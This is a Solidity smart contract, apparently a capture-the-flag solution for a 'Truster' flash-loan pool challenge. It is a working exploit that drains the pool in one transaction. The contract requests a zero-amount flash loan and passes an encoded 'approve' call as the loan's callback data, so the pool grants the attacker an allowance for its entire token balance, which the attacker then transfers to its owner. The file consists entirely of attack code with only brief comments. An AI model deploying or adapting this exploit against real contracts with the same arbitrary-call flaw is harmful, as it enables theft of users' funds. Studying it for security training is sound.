// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        returns (bool);
}

contract TrusterAttacker {

    address immutable owner;
    ITrusterLenderPool immutable target;
    IERC20 immutable token;

    error NotOwner();

    constructor(address _target, address _token) payable {
        owner = msg.sender;
        target = ITrusterLenderPool(_target);
        token = IERC20(_token);
    }

    function exploit() external {
        _onlyOwner();
        // we approve all tokens and don't flashloan anything
        bytes4 selector = bytes4(keccak256("approve(address,uint256)"));
        uint256 targetBalance = token.balanceOf(address(target));
        target.flashLoan(
            0, 
            address(this),
            address(token),
            abi.encodeWithSelector(selector, address(this), targetBalance)
        );
        // transfer to the owner 
        require(token.transferFrom(address(target), msg.sender, targetBalance));
    }

    function _onlyOwner() internal view {
        if (msg.sender != owner) revert NotOwner();
    }
}